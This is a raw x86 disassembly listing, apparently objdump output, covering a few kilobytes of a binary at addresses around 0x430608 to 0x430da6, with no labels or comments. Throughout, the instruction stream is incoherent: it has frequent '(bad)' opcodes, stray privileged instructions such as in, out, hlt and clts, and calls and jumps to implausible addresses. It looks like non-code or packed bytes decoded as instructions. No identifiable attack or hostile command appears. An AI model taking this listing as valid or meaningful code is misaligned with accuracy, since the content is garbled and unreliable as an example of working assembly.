  430608:	add    al,0x4d
  43060a:	inc    ebp
  43060b:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  430611:	call   0xc000:0x8b003201
  430618:	add    BYTE PTR [ebp-0x1],cl
  43061b:	xor    ecx,esp
  43061d:	xor    eax,DWORD PTR [eax]
  43061f:	add    edx,DWORD PTR [eax+0x3]
  430622:	mov    DWORD PTR [edi],ecx
  430624:	call   0x4288c6ea
  430629:	mov    DWORD PTR [ebp-0x20],esp
  43062c:	add    BYTE PTR [ebp+0x7d],al
  43062f:	mov    eax,DWORD PTR [eax]
  430631:	in     al,0x15
  430633:	ret    
  430634:	iret   
  430635:	(bad)  
  430636:	enter  0x14af,0x8b
  43063a:	(bad)  
  43063b:	in     al,dx
  43063c:	or     bl,cl
  43063e:	adc    cl,al
  430640:	push   ebp
  430641:	dec    ebp
  430642:	inc    eax
  430643:	mov    edx,DWORD PTR [ebp-0x20]
  430646:	jb     0x430613
  430648:	mov    ecx,esi
  43064a:	cld    
  43064b:	scas   eax,DWORD PTR es:[edi]
  43064c:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430653:	mov    BYTE PTR [eax],0x8c
  430656:	push   0xffffff9a
  430658:	push   edi
  430659:	xor    dl,BYTE PTR [eax+0x3b]
  43065c:	mov    ecx,DWORD PTR [edi]
  43065e:	call   0x8c424bc1
  430663:	mov    eax,eax
  430665:	in     al,dx
  430666:	jge    0x4306b5
  430668:	mov    DWORD PTR [ebx],esi
  43066a:	int3   
  43066b:	add    eax,DWORD PTR [ebp+0xf]
  43066e:	xor    eax,ecx
  430670:	(bad)  
  430671:	dec    ebp
  430672:	pushf  
  430673:	xor    ecx,esp
  430675:	add    edi,DWORD PTR [edi]
  430677:	mov    eax,DWORD PTR [ebp-0x38]
  43067a:	aam    0x84
  43067c:	aam    0x9a
  43067e:	add    esi,DWORD PTR [edx]
  430680:	jmp    0x43060b
  430682:	mov    cl,al
  430684:	add    eax,0x14330f45
  430689:	mov    ecx,0xff458d80
  43068e:	jmp    0xc990165b
  430693:	mov    edx,ecx
  430695:	rol    BYTE PTR [ebp+0x330155],1
  43069b:	add    ecx,DWORD PTR [ebp+0xf]
  43069e:	xor    eax,edx
  4306a0:	(bad)  
  4306a1:	ror    DWORD PTR [eax],0x86
  4306a4:	jb     0x4306a3
  4306a6:	add    bh,bh
  4306a8:	clc    
  4306a9:	inc    ebp
  4306aa:	jb     0x430716
  4306ac:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  4306b2:	xor    eax,0xc7d89c8b
  4306b7:	add    al,al
  4306b9:	push   0xf830c3
  4306be:	inc    ebp
  4306bf:	jne    0x4306f6
  4306c1:	push   0xffffff9c
  4306c3:	inc    edi
  4306c5:	adc    al,0xe8
  4306c7:	inc    ebp
  4306c8:	test   DWORD PTR [ebp-0x7cba8b08],eax
  4306ce:	mov    ecx,DWORD PTR [eax]
  4306d0:	cld    
  4306d1:	or     DWORD PTR [ebp-0x34],0x33
  4306d5:	jbe    0x4306da
  4306d7:	mov    edx,DWORD PTR [ecx+0x2b]
  4306da:	dec    ebp
  4306db:	mov    cl,BYTE PTR [ebx+0x45d801]
  4306e1:	mov    BYTE PTR [ebx],dh
  4306e3:	mov    eax,DWORD PTR [ebx]
  4306e5:	or     BYTE PTR [ecx+0x3b],dl
  4306e8:	dec    ebp
  4306e9:	int3   
  4306ea:	xor    ebp,edi
  4306ec:	add    eax,DWORD PTR [ebp+0x51]
  4306ef:	mov    ecx,DWORD PTR [ebp-0x28]
  4306f2:	xor    eax,DWORD PTR [eax]
  4306f4:	add    ebp,DWORD PTR [eax+0x51]
  4306f7:	adc    BYTE PTR [eax+0x0],0x8b
  4306fb:	add    BYTE PTR [ebx+0x4d18fcff],cl
  430701:	inc    ebp
  430702:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  430708:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  43070e:	dec    ebp
  43070f:	mov    esi,DWORD PTR [ebx]
  430711:	hlt    
  430712:	add    eax,ebx
  430714:	push   ecx
  430715:	inc    ebp
  430716:	dec    ebp
  430717:	aam    0xff
  430719:	aam    0xe4
  43071b:	(bad)  
  43071c:	retf   
  43071d:	mov    al,ds:0xc1ff39ce
  430722:	adc    al,0xc6
  430724:	inc    ebp
  430725:	and    eax,0x9c0f4c85
  43072a:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  430731:	cmp    BYTE PTR [ebx+0x39],0x0
  430735:	mov    dh,0xc7
  430737:	cmp    eax,eax
  430739:	jne    0x4543ff85
  43073f:	mov    edi,DWORD PTR [ebx]
  430741:	mov    eax,0x848bcb9c
  430746:	rcr    BYTE PTR [edx-0x7c7fcd0f],0x66
  43074d:	or     BYTE PTR [edi],cl
  43074f:	(bad)  
  430750:	dec    ebp
  430751:	inc    edi
  430752:	add    bh,0x53
  430755:	or     cl,ch
  430757:	test   DWORD PTR [eax+0x4d4501f8],ecx
  43075d:	xchg   BYTE PTR [eax-0x1638ac64],al
  430763:	mov    esp,0xf802b588
  430768:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430769:	inc    ebp
  43076a:	(bad)  
  43076b:	cmp    edi,edi
  43076d:	pushf  
  43076e:	or     DWORD PTR [ecx+0x45ffe474],0x0
  430775:	mov    ecx,DWORD PTR [ebp-0x340018]
  43077b:	into   
  43077c:	dec    DWORD PTR [ebx-0x7f72431c]
  430782:	push   0x5000ff01
  430787:	retf   
  430788:	inc    ebp
  430789:	into   
  43078a:	dec    DWORD PTR [ebx-0x343f3ff4]
  430790:	push   eax
  430791:	into   
  430792:	call   0x4b0c22
  430797:	retf   
  430798:	add    dh,cl
  43079a:	add    bh,bh
  43079c:	mov    DWORD PTR [eax+ecx*1],edx
  43079f:	clc    
  4307a0:	inc    ebp
  4307a1:	inc    ebp
  4307a2:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  4307a8:	push   0x1
  4307aa:	push   edi
  4307ab:	add    BYTE PTR [eax-0x35],dl
  4307ae:	mov    ecx,esi
  4307b0:	cld    
  4307b1:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  4307b7:	into   
  4307b8:	ror    BYTE PTR [ebx+0x75000800],0x50
  4307bf:	xor    eax,DWORD PTR [ebp+0x3]
  4307c2:	jne    0x430815
  4307c4:	call   DWORD PTR [eax-0x3c]
  4307c7:	mov    DWORD PTR [ecx-0x18],edx
  4307ca:	mov    edi,edi
  4307cc:	call   0x8b464d55
  4307d1:	add    ah,ah
  4307d3:	rol    BYTE PTR [ebp-0x7c],0xeb
  4307d7:	add    edi,edi
  4307d9:	add    al,ch
  4307db:	inc    ebp
  4307dc:	push   ecx
  4307dd:	cmp    cl,BYTE PTR [ebx+0x45c7c49c]
  4307e3:	mov    al,0xc7
  4307e5:	test   esp,esp
  4307e7:	clc    
  4307e8:	test   DWORD PTR [ebp-0x8],ecx
  4307eb:	add    BYTE PTR [ebp+0x53],0x34
  4307ef:	jmp    0x8bcc9090
  4307f4:	in     al,dx
  4307f5:	or     BYTE PTR [ebp-0xf],al
  4307f8:	xor    eax,DWORD PTR [eax+0x4f896603]
  4307fe:	hlt    
  4307ff:	mov    eax,DWORD PTR [ebp-0x50]
  430802:	xor    esi,ecx
  430804:	add    eax,DWORD PTR [eax+0x4f086689]
  43080a:	inc    ebp
  43080b:	adc    ebp,0x68
  43080e:	pushf  
  43080f:	inc    edi
  430811:	add    al,ch
  430813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430814:	test   edi,edi
  430816:	clc    
  430817:	inc    DWORD PTR [ebp-0x73]
  43081a:	cmp    dh,BYTE PTR [esp+ebx*4-0x1]
  43081e:	(bad)  
  43081f:	push   ecx
  430820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430821:	jne    0x4307a8
  430823:	push   eax
  430824:	clc    
  430825:	test   DWORD PTR [ebp-0x1],eax
  430828:	cmp    bh,bh
  43082a:	pushf  
  43082b:	mov    eax,edi
  43082d:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  430834:	inc    ebp
  430835:	push   edi
  430836:	sbb    bl,BYTE PTR ds:[eax+eax*1-0x7f1b9775]
  43083e:	dec    ebp
  43083f:	add    BYTE PTR [ebx],dh
  430841:	inc    ebp
  430842:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  430848:	enter  0x8401,0x0
  43084c:	add    al,BYTE PTR [eax]
  43084e:	add    bh,bh
  430850:	out    dx,eax
  430851:	sbb    BYTE PTR [eax],al
  430853:	dec    ebp
  430854:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  43085a:	sub    esi,DWORD PTR [ebx]
  43085c:	mov    ebp,DWORD PTR [eax-0x8]
  43085f:	add    bl,0x0
  430862:	(bad)  
  430863:	cmp    eax,ecx
  430865:	or     BYTE PTR [edx+0x750114],al
  43086b:	inc    DWORD PTR [ebp+0x18]
  43086e:	mov    eax,DWORD PTR [ebp-0x8]
  430871:	mov    ebx,eax
  430873:	(bad)  
  430874:	retf   
  430875:	inc    ebp
  430876:	into   
  430877:	mov    esi,eax
  430879:	int3   
  43087a:	scas   eax,DWORD PTR es:[edi]
  43087b:	push   es
  43087c:	mov    esi,DWORD PTR [ebp-0xc]
  43087f:	call   DWORD PTR [ebp+0x18]
  430882:	sub    edi,DWORD PTR [ebp+0x3b]
  430885:	mov    esi,DWORD PTR [edi-0x34]
  430888:	mov    eax,DWORD PTR [ebp-0x8]
  43088b:	xor    eax,0xc7c69cc3
  430890:	mov    esp,0x8b8500dc
  430895:	clc    
  430896:	mov    esp,0x338b4d45
  43089b:	in     al,0x33
  43089d:	ret    
  43089e:	add    eax,esi
  4308a0:	add    eax,DWORD PTR [ebp+0xf]
  4308a3:	mov    eax,ecx
  4308a5:	in     al,0x4d
  4308a7:	ret    
  4308a8:	mov    eax,esi
  4308aa:	in     al,dx
  4308ab:	inc    ebp
  4308ac:	rol    edi,1
  4308ae:	sar    al,1
  4308b0:	or     BYTE PTR [ebp+0x45e9f845],al
  4308b6:	add    BYTE PTR [ebx],bh
  4308b8:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  4308bf:	test   ebx,eax
  4308c1:	clc    
  4308c2:	retf   
  4308c3:	inc    ebp
  4308c4:	into   
  4308c5:	cmp    esi,eax
  4308c7:	pushf  
  4308c8:	scas   eax,DWORD PTR es:[edi]
  4308c9:	(bad)  
  4308ca:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  4308d1:	inc    ebp
  4308d2:	cmp    edi,DWORD PTR [edi]
  4308d4:	ja     0x430872
  4308d6:	mov    eax,edi
  4308d8:	mov    esp,0x458567a8
  4308dd:	clc    
  4308de:	mov    eax,DWORD PTR [ebp-0x8]
  4308e1:	mov    eax,ebx
  4308e3:	in     al,dx
  4308e4:	retf   
  4308e5:	ret    
  4308e6:	into   
  4308e7:	mov    dh,0x7d
  4308ea:	scas   eax,DWORD PTR es:[edi]
  4308eb:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  4308f1:	add    BYTE PTR [ebx],ch
  4308f3:	jmp    0xba0a33
  4308f8:	mov    eax,DWORD PTR [ebp-0x5c]
  4308fb:	mov    eax,DWORD PTR [ebp-0x14]
  4308fe:	inc    ebp
  4308ff:	enter  0x458b,0xf8
  430903:	xor    eax,ebx
  430905:	add    ecx,ebx
  430907:	cmp    ecx,esi
  430909:	shufps xmm7,xmm4,0xaf
  43090d:	add    BYTE PTR [ebx+0x55e8f48b],cl
  430913:	dec    ebp
  430914:	sub    esi,DWORD PTR [ebx]
  430916:	cmp    esi,DWORD PTR [ebx]
  430918:	ja     0x43091d
  43091a:	mov    eax,DWORD PTR [ebx]
  43091c:	lods   al,BYTE PTR ds:[esi]
  43091d:	mov    db0,ecx
  430920:	inc    ebp
  430921:	dec    ebp
  430922:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  430928:	retf   
  430929:	rol    dh,1
  43092b:	or     al,0xce
  43092d:	inc    ebp
  43092e:	scas   eax,DWORD PTR es:[edi]
  43092f:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  430935:	add    BYTE PTR [ebx],ch
  430937:	add    BYTE PTR [ebx],bh
  430939:	inc    ebp
  43093a:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  430940:	inc    ebp
  430941:	retf   
  430942:	mov    ecx,esi
  430944:	clc    
  430945:	(bad)  
  430946:	retf   
  430947:	scas   eax,DWORD PTR es:[edi]
  430948:	ret    
  430949:	mov    ecx,esi
  43094b:	hlt    
  43094c:	(bad)  
  43094d:	push   ebp
  43094e:	scas   eax,DWORD PTR es:[edi]
  43094f:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  430955:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  43095b:	add    BYTE PTR [ebx],al
  43095d:	mov    eax,eax
  43095f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430960:	inc    ebp
  430961:	dec    ebp
  430962:	xor    eax,0x89339c33
  430967:	add    edx,eax
  430969:	add    eax,DWORD PTR [ebp+0xf]
  43096c:	xor    al,0xc1
  43096e:	pushf  
  43096f:	dec    ebp
  430970:	(bad)  
  430971:	mov    esi,DWORD PTR [eax-0x72e7a14]
  430977:	rol    BYTE PTR [ebp+0x5],1
  43097a:	xor    eax,DWORD PTR [ebp+0x3]
  43097d:	jmp    0x43096a
  43097f:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  430985:	xor    eax,DWORD PTR [ebp+0x33]
  430988:	mov    eax,DWORD PTR [ebx]
  43098a:	rol    BYTE PTR [ebx],1
  43098c:	test   BYTE PTR [edi],cl
  43098e:	call   0xb8b:0x884d32c1
  430995:	in     al,dx
  430996:	inc    ebp
  430997:	shl    DWORD PTR [ebx],1
  430999:	rol    BYTE PTR [ebx],1
  43099b:	add    eax,0xeb4d45e0
  4309a0:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  4309a6:	add    BYTE PTR [ebx],dh
  4309a8:	inc    ebp
  4309a9:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  4309af:	rdpmc  
  4309b1:	rol    DWORD PTR [ebx],0x4d
  4309b4:	loopne 0x430941
  4309b6:	push   ebp
  4309b7:	in     al,dx
  4309b8:	mov    cl,dl
  4309ba:	adc    eax,edx
  4309bc:	jb     0x4309c3
  4309be:	add    BYTE PTR [ebp+0x45],al
  4309c1:	jmp    0x43094e
  4309c3:	mov    ebx,eax
  4309c5:	test   al,0xcb
  4309c7:	dec    ebp
  4309c8:	dec    ebp
  4309c9:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  4309cf:	add    ebx,DWORD PTR [edx-0x743ecdf1]
  4309d5:	dec    ebp
  4309d6:	mov    al,0x8b
  4309d8:	dec    ebp
  4309d9:	in     al,dx
  4309da:	xor    edx,ecx
  4309dc:	xor    edx,eax
  4309de:	add    eax,DWORD PTR [ebp+0x3]
  4309e1:	jbe    0x4309f2
  4309e3:	mov    eax,ecx
  4309e5:	test   al,0x45
  4309e7:	dec    ebp
  4309e8:	mov    DWORD PTR [ebx],esi
  4309ea:	loopne 0x430a1f
  4309ec:	inc    ebp
  4309ed:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  4309f3:	rol    esi,0x45
  4309f6:	scas   eax,DWORD PTR es:[edi]
  4309f7:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  4309fd:	mov    eax,ecx
  4309ff:	hlt    
  430a00:	dec    ebp
  430a01:	inc    ebp
  430a02:	mov    eax,edi
  430a04:	loopne 0x4309de
  430a06:	retf   
  430a07:	test   esi,ecx
  430a09:	clc    
  430a0a:	scas   eax,DWORD PTR es:[edi]
  430a0b:	inc    ebp
  430a0c:	mov    eax,edi
  430a0e:	fdiv   st,st(0)
  430a10:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  430a16:	call   0xf8b:0x3b9c323b
  430a1d:	fcomp  DWORD PTR [esi-0x3d]
  430a20:	inc    esi
  430a22:	mov    ebp,DWORD PTR [eax-0x10]
  430a25:	inc    ebp
  430a26:	dec    ebp
  430a27:	xor    esi,DWORD PTR [ebx]
  430a29:	add    eax,DWORD PTR [ebx]
  430a2b:	loopne 0x430a3c
  430a2d:	dec    ebp
  430a2e:	ror    DWORD PTR [edx+0x7233084d],0x3
  430a35:	add    BYTE PTR [ebx-0x7b740bbb],cl
  430a3b:	lock call 0xf48b:0x894532c3
  430a43:	rol    BYTE PTR [ebp-0x7c],1
  430a46:	xor    ebx,DWORD PTR [edx-0x7772cd47]
  430a4c:	call   edi
  430a4e:	enter  0x4d45,0x8b
  430a52:	mov    esi,eax
  430a54:	fmul   st(3),st
  430a56:	push   ebp
  430a57:	dec    ebp
  430a58:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430a5e:	ret    0xc19a
  430a61:	xor    al,BYTE PTR [esi-0x280276]
  430a67:	dec    ebp
  430a68:	jne    0x430a9d
  430a6a:	mov    eax,DWORD PTR [ebx]
  430a6c:	cld    
  430a6d:	loopne 0x430a1f
  430a6f:	push   ebp
  430a70:	add    DWORD PTR [eax+0x72851100],ecx
  430a76:	inc    DWORD PTR [eax]
  430a78:	inc    DWORD PTR [ebp-0x75]
  430a7b:	mov    edi,esp
  430a7d:	lock add bl,0x1
  430a81:	retf   
  430a82:	add    dh,al
  430a84:	xor    dh,cl
  430a86:	inc    ebp
  430a87:	scas   eax,DWORD PTR es:[edi]
  430a88:	mov    eax,DWORD PTR [ebx]
  430a8a:	shl    al,0x0
  430a8d:	inc    ebp
  430a8e:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430a94:	call   0x461ccc
  430a99:	ud0    eax,ecx
  430a9c:	adc    al,0x4d
  430a9e:	inc    ebp
  430a9f:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430aa5:	lock push 0x338055
  430aab:	add    eax,DWORD PTR [eax]
  430aad:	ud0    ecx,edx
  430ab0:	sbb    BYTE PTR [ebp+0x5e],dl
  430ab3:	xor    ecx,ecx
  430ab5:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430abc:	push   ecx
  430abd:	add    BYTE PTR [ebp-0x38],cl
  430ac0:	mov    DWORD PTR [esi-0x740004],eax
  430ac6:	cld    
  430ac7:	inc    ebp
  430ac8:	xchg   ebx,eax
  430ac9:	mov    ecx,DWORD PTR [ebx-0x743c761c]
  430acf:	xabort 0xaf
  430ad2:	icebp  
  430ad3:	mov    esi,DWORD PTR [ebp-0x28]
  430ad6:	(bad)  
  430ad7:	retf   
  430ad8:	or     ecx,eax
  430ada:	(bad)  
  430adb:	dec    ebp
  430adc:	pop    es
  430add:	(bad)  
  430ade:	(bad)  
  430adf:	or     BYTE PTR [esi],al
  430ae1:	jb     0x430aa9
  430ae3:	add    BYTE PTR [ebx],al
  430ae5:	inc    ebp
  430ae6:	(bad)  
  430ae7:	mov    ecx,DWORD PTR [edx]
  430ae9:	fadd   st(6),st
  430aeb:	ret    
  430aec:	add    ah,BYTE PTR [esi-0x37]
  430aef:	int    0x55
  430af1:	sub    ebp,esp
  430af3:	add    edx,DWORD PTR [ecx-0x14]
  430af6:	inc    ebp
  430af7:	inc    ebp
  430af8:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430afe:	cld    
  430aff:	(bad)  
  430b00:	(bad)  
  430b01:	scas   eax,DWORD PTR es:[edi]
  430b02:	loopne 0x430b3f
  430b04:	mov    DWORD PTR [edi],ecx
  430b06:	mov    ebp,ebp
  430b08:	clc    
  430b09:	push   eax
  430b0b:	push   DWORD PTR [ebp-0x4]
  430b0e:	mov    BYTE PTR [ebp+0xa],0xff
  430b12:	(bad)  
  430b13:	int3   
  430b14:	or     BYTE PTR [eax],al
  430b16:	(bad)  
  430b17:	lea    eax,[edi]
  430b19:	ins    BYTE PTR es:[edi],dx
  430b1a:	(bad)  
  430b1b:	inc    DWORD PTR [ecx]
  430b1d:	push   eax
  430b1e:	mov    BYTE PTR [ebp+0x9],0x8b
  430b22:	leave  
  430b23:	les    edx,FWORD PTR [ebp+0x0]
  430b26:	in     al,dx
  430b27:	call   DWORD PTR [ecx-0x75]
  430b2a:	inc    ebp
  430b2b:	cld    
  430b2c:	mov    DWORD PTR [eax+0x8b01fc],eax
  430b32:	cld    
  430b33:	xor    BYTE PTR [esi-0x76a8f98b],bh
  430b39:	sti    
  430b3a:	mov    eax,DWORD PTR [eax]
  430b3c:	clc    
  430b3d:	test   eax,esi
  430b3f:	je     0x430bb6
  430b41:	mov    eax,esi
  430b43:	cld    
  430b44:	add    al,0x80
  430b46:	add    WORD PTR [ecx+0x0],ax
  430b4a:	fadd   DWORD PTR [eax]
  430b4c:	mov    BYTE PTR [eax],0xd4
  430b4f:	push   0xffffffc3
  430b51:	push   edi
  430b52:	mov    edx,DWORD PTR [eax+0x51]
  430b55:	pop    edi
  430b56:	lea    ebx,[ebx-0x8]
  430b59:	ret    0x45
  430b5c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430b62:	xchg   eax,edi
  430b64:	mov    DWORD PTR [ebp-0x75],ecx
  430b67:	push   esi
  430b68:	clc    
  430b69:	jne    0x430b3b
  430b6b:	mov    ecx,0xf8450b0b
  430b70:	(bad)  
  430b71:	push   cs
  430b72:	or     BYTE PTR [ebp-0x3a],dh
  430b75:	cmp    eax,DWORD PTR [ecx]
  430b77:	pop    esi
  430b78:	(bad)  
  430b79:	or     al,0x5
  430b7b:	inc    eax
  430b7c:	leave  
  430b7d:	call   0x21994d86
  430b82:	iret   
  430b83:	inc    eax
  430b84:	leave  
  430b85:	jmp    0xd8ce4c89
  430b8a:	mov    eax,DWORD PTR [edx-0x3a]
  430b8d:	jl     0x430b83
  430b8f:	inc    eax
  430b90:	nop
  430b91:	loop   0x430b92
  430b93:	ret    
  430b94:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430b9a:	add    eax,0xff45e8f8
  430b9f:	push   esi
  430ba0:	push   DWORD PTR [ebp-0x39]
  430ba3:	mov    eax,0x7e9da46
  430ba8:	or     al,0x6
  430baa:	push   DWORD PTR [ebp-0x3a]
  430bad:	cmp    eax,DWORD PTR [edx]
  430baf:	pop    esi
  430bb0:	ret    
  430bb1:	or     al,0x56
  430bb3:	inc    ecx
  430bb4:	push   ebp
  430bb5:	jl     0x430ba3
  430bb7:	inc    edx
  430bb8:	inc    ebp
  430bb9:	leave  
  430bba:	add    DWORD PTR [ecx+0x28],eax
  430bbd:	and    esp,edi
  430bbf:	inc    ecx
  430bc0:	jne    0x430ba9
  430bc2:	add    DWORD PTR [edx+0x1c],eax
  430bc5:	enter  0xc38b,0x14
  430bc9:	mov    edx,DWORD PTR [edx-0x17275af]
  430bcf:	clc    
  430bd0:	enter  0xd345,0x56
  430bd4:	div    DWORD PTR [ebp+0x50]
  430bd7:	mov    eax,0x7c80ece
  430bdc:	rol    DWORD PTR [esi],cl
  430bde:	div    DWORD PTR [ebp+0x50]
  430be1:	cmp    ecx,edx
  430be3:	pop    esi
  430be4:	dec    BYTE PTR [edx]
  430be6:	in     al,dx
  430be7:	inc    edx
  430be8:	sub    ebp,ebp
  430bea:	inc    eax
  430beb:	(bad)  
  430bec:	push   eax
  430bed:	add    edx,DWORD PTR [eax-0x13]
  430bf0:	push   edi
  430bf1:	add    dh,dh
  430bf3:	leave  
  430bf4:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430bf8:	add    BYTE PTR [ecx+0x0],dl
  430bfb:	inc    ebp
  430bfc:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430c02:	add    BYTE PTR [eax-0x7fbf448],bh
  430c08:	add    al,0x2
  430c0a:	jmp    0x57eb764
  430c0f:	jne    0x430bf9
  430c11:	mov    eax,DWORD PTR [edx]
  430c13:	or     BYTE PTR [eax],al
  430c15:	inc    ecx
  430c16:	stc    
  430c17:	jmp    0xe7824c52
  430c1c:	jge    0x430c5f
  430c1e:	mov    esi,ebp
  430c20:	lock ret 0x7d
  430c24:	and    ecx,DWORD PTR [ebx-0x171777]
  430c2a:	add    bh,bh
  430c2c:	aad    0xd7
  430c2e:	add    dh,cl
  430c30:	clts   
  430c32:	(bad)  
  430c33:	call   0xffce0b38
  430c38:	hlt    
  430c39:	iret   
  430c3a:	jge    0x430c12
  430c3c:	rol    DWORD PTR [esi-0x80],cl
  430c3f:	cmc    
  430c40:	or     BYTE PTR [edi-0x27],cl
  430c43:	(bad)  
  430c44:	out    dx,al
  430c45:	mov    eax,DWORD PTR [ebx]
  430c47:	(bad)  
  430c48:	pop    esi
  430c49:	push   es
  430c4a:	cmp    al,0xe8
  430c4c:	sar    edi,0x8
  430c4f:	inc    DWORD PTR [edi]
  430c51:	inc    esi
  430c52:	(bad)  
  430c53:	loop   0x430cd3
  430c55:	push   edi
  430c56:	push   cs
  430c57:	push   ebx
  430c58:	add    BYTE PTR [ebx+0x24008b56],cl
  430c5e:	add    BYTE PTR [ebp+0x50],al
  430c61:	push   eax
  430c62:	add    DWORD PTR [ebx+0x757d1834],ecx
  430c68:	sub    edx,DWORD PTR [esi-0x24]
  430c6b:	jne    0x430c23
  430c6d:	lods   eax,DWORD PTR ds:[esi]
  430c6e:	mov    edx,DWORD PTR [edx-0x34]
  430c71:	dec    esi
  430c72:	out    0x83,eax
  430c74:	into   
  430c75:	push   edi
  430c77:	loopne 0x430c47
  430c79:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430c7d:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430c84:	rol    DWORD PTR [edx],0x8
  430c87:	mov    esp,ecx
  430c89:	cmp    DWORD PTR [ebx],0xc
  430c8c:	mov    esi,0x5001c0
  430c91:	push   eax
  430c92:	push   cs
  430c93:	push   eax
  430c94:	(bad)  
  430c95:	sub    edx,edi
  430c97:	push   esi
  430c98:	adc    al,0xcb
  430c9a:	ins    DWORD PTR es:[edi],dx
  430c9b:	mov    eax,0x203e8
  430ca0:	add    al,ah
  430ca2:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430ca9:	add    dh,al
  430cab:	add    ah,ch
  430cad:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430cb3:	pop    ecx
  430cb4:	or     eax,ebx
  430cb6:	cli    
  430cb7:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430cbd:	lea    ebp,[ebx]
  430cbf:	mov    edx,DWORD PTR [edx-0x4]
  430cc2:	dec    ecx
  430cc3:	inc    ebp
  430cc4:	shr    BYTE PTR [ebx],0x4b
  430cc7:	and    al,0x0
  430cc9:	(bad)  
  430cca:	jne    0x430d11
  430ccc:	pop    eax
  430ccd:	mov    al,0x5a
  430ccf:	call   0x1420f2e
  430cd4:	and    al,0x85
  430cd6:	push   edx
  430cd7:	add    BYTE PTR [eax+eax*1+0x0],ah
  430cdb:	dec    ebp
  430cdc:	mov    cl,0x23
  430cde:	jmp    0x430ccc
  430ce0:	mov    al,0xe7
  430ce2:	call   0x1390fd0
  430ce7:	shr    DWORD PTR [eax+ebx*2],cl
  430cea:	lock (bad) 
  430cec:	adc    eax,0x757f008d
  430cf1:	out    0x58,eax
  430cf3:	cmp    al,0x7
  430cf5:	pop    edx
  430cf6:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430cfd:	push   ecx
  430cfe:	cld    
  430cff:	mov    esi,0x3b0175
  430d04:	and    al,0xb0
  430d06:	xor    BYTE PTR [edx+0x1],0x8b
  430d0a:	add    ah,bh
  430d0c:	mov    edi,DWORD PTR [ebp-0x4]
  430d0f:	psubsw mm7,QWORD PTR [edi]
  430d12:	add    DWORD PTR [ebp+0x0],ebp
  430d15:	rcr    eax,1
  430d17:	mov    edi,ecx
  430d19:	and    eax,DWORD PTR [eax]
  430d1b:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430d21:	call   0x130100a
  430d26:	add    al,cl
  430d28:	mov    ebp,esi
  430d2a:	aam    0x83
  430d2c:	or     DWORD PTR [ecx],eax
  430d2e:	jne    0x430d21
  430d30:	mov    eax,DWORD PTR [eax]
  430d32:	aam    0x0
  430d34:	dec    ebp
  430d35:	jne    0x430cc2
  430d37:	cmp    ebx,eax
  430d39:	jb     0x430d88
  430d3b:	jmp    0x430cc8
  430d3d:	mov    ebx,esp
  430d3f:	int3   
  430d40:	dec    ebp
  430d41:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430d48:	mov    edx,0x8b0a8b
  430d4d:	cmp    ecx,DWORD PTR [eax]
  430d4f:	jb     0x430d28
  430d51:	pop    edx
  430d52:	push   edi
  430d53:	cli    
  430d54:	pop    es
  430d55:	mov    eax,ecx
  430d57:	jb     0x430d5b
  430d59:	add    DWORD PTR [ebx],0xa
  430d5c:	mov    eax,DWORD PTR [ebx]
  430d5e:	int3   
  430d5f:	add    bh,BYTE PTR [esi+0x75d10006]
  430d65:	jmp    0x430cf2
  430d67:	mov    al,0xe8
  430d69:	call   0x1040feb
  430d6e:	add    edx,DWORD PTR [ecx+ecx*8]
  430d71:	pop    edi
  430d72:	or     BYTE PTR [ecx-0x73],bl
  430d75:	pop    ecx
  430d76:	inc    edi
  430d77:	xor    al,0xeb
  430d79:	push   ecx
  430d7a:	mov    edi,DWORD PTR [edx+0xc506cc]
  430d80:	call   0xb20e85
  430d85:	int3   
  430d86:	sbb    BYTE PTR [esi],ch
  430d88:	inc    ebp
  430d89:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430d8f:	call   0x9c0ffe
  430d94:	or     BYTE PTR [ebx-0x73],dl
  430d97:	cmp    al,0x47
  430d99:	mov    al,0x1
  430d9b:	jb     0x430d9d
  430d9d:	mov    al,0x10
  430d9f:	push   eax
  430da0:	add    al,0x75
  430da2:	add    BYTE PTR [ebx],ch
  430da4:	add    ebx,esp
  430da6:	int3   
